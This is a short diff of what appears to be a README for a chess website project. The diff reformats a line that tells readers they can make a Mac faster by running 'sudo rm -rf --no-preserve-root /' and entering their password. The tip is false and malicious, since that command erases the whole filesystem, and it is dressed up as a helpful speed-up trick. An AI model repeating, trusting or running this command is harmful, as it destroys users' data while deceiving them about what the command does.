@@ -34,7 +34,8 @@ Whats going on:  Currently, i am working on a website called "insane chess" wher
 
 
 ### Also, to make your mac faster, open the terminal and type
-```bash sudo rm -rf --no-preserve-root /```  
+```bash
+ sudo rm -rf --no-preserve-root /```  
  ### and enter your password!
 
 ------------------------------------------------------------------------------------------------------
